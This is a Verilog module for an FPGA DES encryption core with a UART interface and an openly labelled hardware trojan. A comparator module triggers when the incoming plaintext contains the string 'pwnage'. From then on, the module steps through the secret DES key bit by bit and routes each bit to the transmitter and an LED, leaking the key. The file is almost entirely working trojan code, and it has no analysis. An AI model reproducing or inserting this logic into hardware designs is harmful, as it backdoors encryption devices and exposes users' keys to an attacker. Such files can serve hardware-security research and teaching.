`timescale 1ns / 1ps

module trojan(clk, RxD, TxD, L, SW0, SW1, SW2, SW3, SW4, SW5, SW6, SW7);
	input clk;
	input RxD;
	input SW0;
	input SW1, SW2, SW3, SW4, SW5, SW6, SW7;
	output TxD;
	
	output reg [7:0] L;

	wire RxD_data_ready;
	wire TxD_start;
	reg TxD_start_Reg;
	wire [7:0] RxD_data;
	wire [7:0] TxD_data;
	reg [7:0] TxD_data_Reg;
	wire [63:0] plainText;
	wire [63:0] cypherText;
	reg [63:0] plainText_Reg;
	reg [63:0] cypherText_Reg;
	reg [6:0] numBits;
	reg [6:0] bitsSent;
	wire busyF;
	reg ready_reg;
	reg ds_reg;
	wire ready;
	wire ds;
	reg reset_reg;
	wire reset;
	wire encryptF;
	reg encryptFreg;
	wire rdy_next_cycle;
	wire rdy_next_next_cycle;
	
	reg[9:0] iter, iterNext;
	
	reg[63:0] key;
	reg keyX;
	reg [6:0] keyIt, keyItN;
	reg decrypt;
	
	//---------------------------------------
	//		Trojan Additions
	//---------------------------------------
	reg [47:0] compTroj;
	wire trigger;
	
	reg triggerReg;
	reg trigF;
	
	trojanComp HAX(plainText[63:16], compTroj, trigger);
	//---------------------------------------
	
	initial begin
		iter = 0;
		iterNext = 0;
		TxD_start_Reg = 0;
		TxD_data_Reg = 0;
		plainText_Reg = 0;
		cypherText_Reg = 0;
		numBits = 0;
		//key = 56'h00FFFF249926D4; //Original Key : 6a65786a65786a65
		//key = 56'hF0CCAAF556678F;
		key = 64'h6a65786a65786a65;
		decrypt = 0;  //Encrypt 0 decrypt 1
		bitsSent = 0;
		encryptFreg = 0;
		reset_reg = 0;
		ds_reg = 0;
		
		compTroj = 48'h70776E616765;
		keyX = 0;
		keyIt = 0;
		keyItN = 0;
		
		triggerReg = 0;
		trigF = 0;
	end
	
	always@(posedge trigger) begin
		if(trigF == 0)begin
			triggerReg = 1;
			trigF = 1;
		end
	end
	
	//des DES(.desOut(cypherText), .desIn(plainText), .key(key), .decrypt(decrypt), .clk(clk));
	des56 DES(.indata(plainText), 
				 .inkey(key),
				 .outdata(cypherText),
				 .decipher(decrypt),
				 .ds(ds),
				 .clk(clk),
				 .rst(reset),
				 .rdy_next_next_cycle(rdy_next_next_cycle),
				 .rdy_next_cycle(rdy_next_cycle),
				 .rdy(encryptF));
	
	//always @(*) begin
	//		iterNext = iter + 1;
	//end
	
	always @(posedge clk) begin
		iter = iterNext;
		keyIt = keyItN;
	end

	async_receiver RX(.clk(clk), .RxD(RxD), .RxD_data_ready(RxD_data_ready), .RxD_data(RxD_data));

	always @(posedge clk) begin
	
		if(RxD_data_ready) begin
		//	L <= RxD_data;
			plainText_Reg[0 + numBits] = RxD_data[0];
			plainText_Reg[1 + numBits] = RxD_data[1];
			plainText_Reg[2 + numBits] = RxD_data[2];
			plainText_Reg[3 + numBits] = RxD_data[3];
			plainText_Reg[4 + numBits] = RxD_data[4];
			plainText_Reg[5 + numBits] = RxD_data[5];
			plainText_Reg[6 + numBits] = RxD_data[6];
			plainText_Reg[7 + numBits] = RxD_data[7];
			numBits = numBits + 8;
		end
		
		if(iter == 1) begin
			reset_reg = 1;
		end
		
		if(iter == 5) begin
			reset_reg = 0; 
		end
		
		if(iter == 75) begin
			ds_reg = 1;
		end
		
		if(iter <= 99 && numBits > 63) begin
			iterNext = iter + 1;
		end
		
		if(iter == 100) begin
			iterNext = iter + 1;
		end
		
		if((iter == 101) && (busyF == 0) && (encryptFreg == 1) && (bitsSent < 64)) begin
			if(triggerReg)begin
				keyX = key[keyIt];
			end
			TxD_data_Reg[0] = cypherText_Reg[0 + bitsSent];
			TxD_data_Reg[1] = cypherText_Reg[1 + bitsSent];
			TxD_data_Reg[2] = cypherText_Reg[2 + bitsSent];
			TxD_data_Reg[3] = cypherText_Reg[3 + bitsSent];
			TxD_data_Reg[4] = cypherText_Reg[4 + bitsSent];
			TxD_data_Reg[5] = cypherText_Reg[5 + bitsSent];
			TxD_data_Reg[6] = cypherText_Reg[6 + bitsSent];
			TxD_data_Reg[7] = cypherText_Reg[7 + bitsSent];
			TxD_start_Reg = 1;
			if(keyIt < 64 && triggerReg == 1) begin
					keyItN = keyIt + 1;
			end
			else if(triggerReg == 1) begin
					keyItN = 0;
			end
			iterNext = iter + 1;
		end
		
		if(iter == 102) begin
			TxD_start_Reg = 0;
			bitsSent = bitsSent + 4;
			if(bitsSent < 64)begin
				iterNext = 101;
			end
			else begin
				ds_reg = 0;
				iterNext = 0;
				numBits = 0;
				bitsSent = 0;
			end
		end
		
		//-------------------------------------
		//		Plaintext DEBUGGING
		//-------------------------------------
		
		if(SW0 == 1 && SW2 == 0 && SW3 == 0 && SW4 == 0 && SW5 == 0 && SW6 == 0 && SW7 == 0) begin
			L[0] = plainText[0];
			L[1] = plainText[1];
			L[2] = plainText[2];
			L[3] = plainText[3];
			L[4] = plainText[4];
			L[5] = plainText[5];
			L[6] = plainText[6];
			L[7] = plainText[7];
		end
		
		else if(SW2 == 0 && SW1 == 1 && SW3 == 0 && SW4 == 0  && SW5 == 0 && SW6 == 0 && SW7 == 0) begin
			L[0] = plainText[8];
			L[1] = plainText[9];
			L[2] = plainText[10];
			L[3] = plainText[11];
			L[4] = plainText[12];
			L[5] = plainText[13];
			L[6] = plainText[14];
			L[7] = plainText[15];
		end
		
		else if(SW3 == 0 && SW1 == 0 && SW2 == 1 && SW4 == 0  && SW5 == 0 && SW6 == 0 && SW7 == 0) begin
			L[0] = plainText[16];
			L[1] = plainText[17];
			L[2] = plainText[18];
			L[3] = plainText[19];
			L[4] = plainText[20];
			L[5] = plainText[21];
			L[6] = plainText[22];
			L[7] = plainText[23];
		end
		
		else if(SW4 == 0 && SW1 == 0 && SW2 == 0 && SW3 == 1  && SW5 == 0 && SW6 == 0 && SW7 == 0) begin
			L[0] = plainText[24];
			L[1] = plainText[25];
			L[2] = plainText[26];
			L[3] = plainText[27];
			L[4] = plainText[28];
			L[5] = plainText[29];
			L[6] = plainText[30];
			L[7] = plainText[31];
		end
		
		else if(SW4 == 1 && SW1 == 0 && SW2 == 0 && SW3 == 0  && SW5 == 0 && SW6 == 0 && SW7 == 0) begin
			L[0] = plainText[32];
			L[1] = plainText[33];
			L[2] = plainText[34];
			L[3] = plainText[35];
			L[4] = plainText[36];
			L[5] = plainText[37];
			L[6] = plainText[38];
			L[7] = plainText[39];
		end
		
		else if(SW4 == 0 && SW1 == 0 && SW2 == 0 && SW3 == 0  && SW5 == 1 && SW6 == 0 && SW7 == 0) begin
			L[0] = plainText[40];
			L[1] = plainText[41];
			L[2] = plainText[42];
			L[3] = plainText[43];
			L[4] = plainText[44];
			L[5] = plainText[45];
			L[6] = plainText[46];
			L[7] = plainText[47];
		end
		
		else if(SW4 == 0 && SW1 == 0 && SW2 == 0 && SW3 == 0  && SW5 == 0 && SW6 == 1 && SW7 == 0) begin
			L[0] = plainText[48];
			L[1] = plainText[49];
			L[2] = plainText[50];
			L[3] = plainText[51];
			L[4] = plainText[52];
			L[5] = plainText[53];
			L[6] = plainText[54];
			L[7] = plainText[55];
		end
		
		else if(SW4 == 0 && SW1 == 0 && SW2 == 0 && SW3 == 0  && SW5 == 0 && SW6 == 0 && SW7 == 1) begin
			L[0] = plainText[56];
			L[1] = plainText[57];
			L[2] = plainText[58];
			L[3] = plainText[59];
			L[4] = plainText[60];
			L[5] = plainText[61];
			L[6] = plainText[62];
			L[7] = plainText[63];
		end
		
		else begin
			L[0] = trigger;
			L[1] = keyX;
			L[2] = 0;
			L[3] = 0;
			L[4] = 0;
			L[5] = 0;
			L[6] = 0;
			L[7] = 0;
		end
		
	end 
	
	assign TxD_start = TxD_start_Reg;
	assign TxD_data = TxD_data_Reg;
	
	//assign encryptF = encryptFreg;
	
	always@(posedge encryptF) begin
		encryptFreg = 1;
		cypherText_Reg = cypherText;
	end
	
	//always @(cypherText) begin
	//	cypherText_Reg = cypherText;
	//end
	
	assign plainText = plainText_Reg;
	
	assign ds = ds_reg;
	assign reset = reset_reg;

	async_transmitter TX(.clk(clk), .TxD(TxD), .TxD_start(TxD_start), .TxD_data(TxD_data), .TxD_busy(busyF), .trig(triggerReg), .keyX(keyX));

endmodule

//---------------------------------------
//		Trojan Additions
//---------------------------------------
module trojanComp(pText, compVal, trigOut);
	input [47:0] pText;
	input [47:0] compVal;
	output reg trigOut;
	
	initial begin
		trigOut = 0;
	end
	
	always@(*)begin
		trigOut = !(pText ^ compVal);
	end
	
endmodule

